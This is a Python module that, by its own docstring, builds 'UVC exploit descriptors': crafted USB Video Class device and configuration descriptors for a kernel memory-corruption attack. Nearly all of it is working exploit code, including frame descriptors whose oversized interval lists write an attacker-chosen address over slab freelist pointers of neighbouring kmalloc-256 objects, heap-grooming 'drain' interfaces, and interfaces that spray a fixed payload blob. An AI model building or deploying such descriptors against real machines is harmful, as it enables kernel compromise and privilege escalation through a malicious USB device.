"""Pure-Python construction of the static UVC exploit descriptors."""

from dataclasses import dataclass
import struct


CS_INTERFACE = 0x24
BMA_SIZE = 136
MAX_IV_PER_DESC = (255 - 26) // 4
GUID_YUY2 = bytes([
    0x59, 0x55, 0x59, 0x32, 0x00, 0x00, 0x10, 0x00,
    0x80, 0x00, 0x00, 0xAA, 0x00, 0x38, 0x9B, 0x71,
])
_FILLER = bytes(
    value
    for upper in range(ord("A"), ord("Z") + 1)
    for lower in range(ord("a"), ord("z") + 1)
    for digit in range(ord("0"), ord("9") + 1)
    for value in (upper, lower, digit)
)


def filler(length: int) -> bytes:
    if length < 0 or length > len(_FILLER):
        raise ValueError(f"filler length {length} is outside 0..{len(_FILLER)}")
    return _FILLER[:length]


@dataclass(frozen=True)
class DescriptorSet:
    device: bytes
    configuration: bytes
    payload_interfaces: tuple[int, ...]


def _filler_word(slot: int) -> int:
    word = _FILLER[4 * slot:4 * slot + 4]
    if len(word) != 4:
        raise ValueError(f"filler slot {slot} exceeds the unique period")
    return int.from_bytes(word, "little")


def _vc_header(streaming_interfaces, total_length=0):
    count = len(streaming_interfaces)
    return (
        bytes([12 + count, CS_INTERFACE, 0x01])
        + struct.pack("<HHIB", 0x0100, total_length, 6000000, count)
        + bytes(streaming_interfaces)
    )


def _vc_input_terminal(terminal_id=1, terminal_type=0x0201):
    return (
        bytes([18, CS_INTERFACE, 0x02, terminal_id])
        + struct.pack("<H", terminal_type)
        + bytes([0, 0])
        + struct.pack("<HHH", 0, 0, 0)
        + bytes([3, 0, 0, 0])
    )


def _vc_output_terminal(terminal_id=2, source=1, terminal_type=0x0101):
    return (
        bytes([9, CS_INTERFACE, 0x03, terminal_id])
        + struct.pack("<H", terminal_type)
        + bytes([0, source, 0])
    )


def _vc_processing_unit(unit_id=3, source=1, controls=bytes([0x01])):
    count = len(controls)
    return (
        bytes([9 + count, CS_INTERFACE, 0x05, unit_id, source])
        + struct.pack("<H", 0)
        + bytes([count])
        + controls
        + bytes([0])
    )


def _vs_input_header(num_formats, total_length, endpoint, terminal_link, controls):
    if len(controls) % num_formats:
        raise ValueError("VS controls are not divisible by format count")
    control_size = len(controls) // num_formats
    descriptor_length = 13 + len(controls)
    if control_size > 255 or descriptor_length > 255:
        raise ValueError("VS input header exceeds a u8 field")
    return (
        bytes([descriptor_length, CS_INTERFACE, 0x01, num_formats])
        + struct.pack("<H", total_length)
        + bytes([endpoint, 0, terminal_link, 0, 0, 0, control_size])
        + controls
    )


def _vs_format_uncompressed(index=1, frame_count=1):
    return (
        bytes([27, CS_INTERFACE, 0x04, index, frame_count])
        + GUID_YUY2
        + bytes([16, 1, 0, 0, 0, 0])
    )


def _vs_format_dv(index=1):
    return bytes([9, CS_INTERFACE, 0x0C, index]) + struct.pack("<I", 691200) + bytes([0])


def _vs_frame(subtype, index=1, width=640, height=480, intervals=1):
    descriptor_length = 26 + 4 * intervals
    descriptor = bytes([descriptor_length, CS_INTERFACE, subtype, index, 0])
    descriptor += struct.pack("<HH", width, height)
    descriptor += struct.pack("<III", 1000000, 1000000, width * height * 2)
    descriptor += struct.pack("<I", 333333) + bytes([intervals])
    descriptor += struct.pack("<I", 333333) * intervals
    return descriptor


def _emit_oob_frames(targets, start_index=2):
    total = max(targets) + 1
    output = bytearray()
    slot = 0
    index = start_index
    while slot < total:
        count = min(MAX_IV_PER_DESC, total - slot)
        if slot + count - 1 in targets and slot + count in targets:
            count -= 1
        descriptor = bytearray(bytes([26 + 4 * count, CS_INTERFACE, 0x00, index, 0]))
        descriptor += struct.pack("<HHIIIIB", 640, 480, 1000000, 1000000, 614400, 333333, count)
        for current in range(slot, slot + count):
            value = targets[current] if current in targets else _filler_word(current)
            descriptor += struct.pack("<I", value)
        output += descriptor
        slot += count
        index += 1
    return bytes(output)


def _vs_oob_frames(target_address, layout, neighbours):
    low = target_address & 0xFFFFFFFF
    high = (target_address >> 32) & 0xFFFFFFFF
    if low == 0 or high == 0:
        raise ValueError(
            f"target 0x{target_address:016x} has a zero u32 half; the UVC parser rewrites it"
        )
    targets = {}
    for neighbour in neighbours:
        slot = (
            layout.kmalloc_256_object_size * neighbour
            + layout.kmalloc_256_freeptr_offset
            - layout.uvc_interval_write_offset
        ) // 4
        targets[slot] = low
        targets[slot + 1] = high
    return _emit_oob_frames(targets)


def _build_f0_vc():
    body = _vc_input_terminal()
    body += _vc_processing_unit()
    body += _vc_output_terminal(source=3)
    header = _vc_header([1])
    return _vc_header([1], len(header) + len(body)) + body


def _build_vc(streaming_interfaces):
    body = _vc_input_terminal() + _vc_output_terminal()
    header = _vc_header(streaming_interfaces)
    return _vc_header(streaming_interfaces, len(header) + len(body)) + body


def _build_f0_vs(endpoint=0x81):
    body = _vs_format_uncompressed() + _vs_frame(0x05)
    header = _vs_input_header(1, 0, endpoint, 2, bytes(1))
    return _vs_input_header(1, len(header) + len(body), endpoint, 2, bytes(1)) + body


def _build_overflow(target_address, layout, neighbours):
    body = _vs_format_dv()
    body += _vs_oob_frames(target_address, layout, neighbours)
    body += _vs_frame(0x05, index=8) + _vs_frame(0x05, index=9)
    header = _vs_input_header(1, 0, 0x81, 2, bytes(1))
    return _vs_input_header(1, len(header) + len(body), 0x81, 2, bytes(1)) + body


def _build_payload(controls):
    body = _vs_format_uncompressed() + _vs_frame(0x05)
    header = _vs_input_header(1, 0, 0x82, 2, controls)
    return _vs_input_header(1, len(header) + len(body), 0x82, 2, controls) + body


def _endpoint(address, attributes, packet_size, interval=0):
    return struct.pack("<BBBBHB", 7, 0x05, address, attributes, packet_size, interval)


def _interface(number, class_number, subclass, raw=b"", endpoints=()):
    return (
        bytes([9, 0x04, number, 0, len(endpoints), class_number, subclass, 0, 0])
        + raw
        + b"".join(endpoints)
    )


def build(profile, blob: bytes, drain: int, neighbours) -> DescriptorSet:
    """Build the arm-only device and configuration descriptors."""
    if len(blob) != BMA_SIZE:
        raise ValueError(f"payload blob must be {BMA_SIZE} bytes, got {len(blob)}")
    if drain < 0:
        raise ValueError("drain must not be negative")
    if not neighbours or any(value <= 0 for value in neighbours):
        raise ValueError("neighbours must contain positive indices")

    f1_vc_number = 2 + drain
    vs_a_number = 3 + drain
    vs_b_number = vs_a_number + 1
    vs_c_number = vs_a_number + 2
    payload_interfaces = (1, vs_a_number, vs_b_number, vs_c_number)

    interfaces = [
        _interface(0, 0x0E, 0x01, _build_f0_vc(), (_endpoint(0x83, 0x03, 16, 1),)),
        _interface(1, 0x0E, 0x02, _build_f0_vs(), (_endpoint(0x81, 0x02, 64),)),
    ]
    interfaces.extend(_interface(number, 0xFF, 0x00) for number in range(2, 2 + drain))
    streaming = [vs_a_number, vs_b_number, vs_c_number]
    interfaces.extend([
        _interface(f1_vc_number, 0x0E, 0x01, _build_vc(streaming)),
        _interface(vs_a_number, 0x0E, 0x02, _build_overflow(profile.core_name_size, profile.layout, neighbours)),
        _interface(vs_b_number, 0x0E, 0x02, _build_payload(blob)),
        _interface(vs_c_number, 0x0E, 0x02, _build_payload(blob)),
    ])
    arm_interface_count = len(interfaces)
    body = b"".join(interfaces)
    configuration = struct.pack(
        "<BBHBBBBB", 9, 0x02, 9 + len(body), arm_interface_count, 1, 0, 0xE0, 250
    ) + body
    device = bytes.fromhex("120100020000004009120600000001020301")
    return DescriptorSet(
        device=device,
        configuration=configuration,
        payload_interfaces=payload_interfaces,
    )
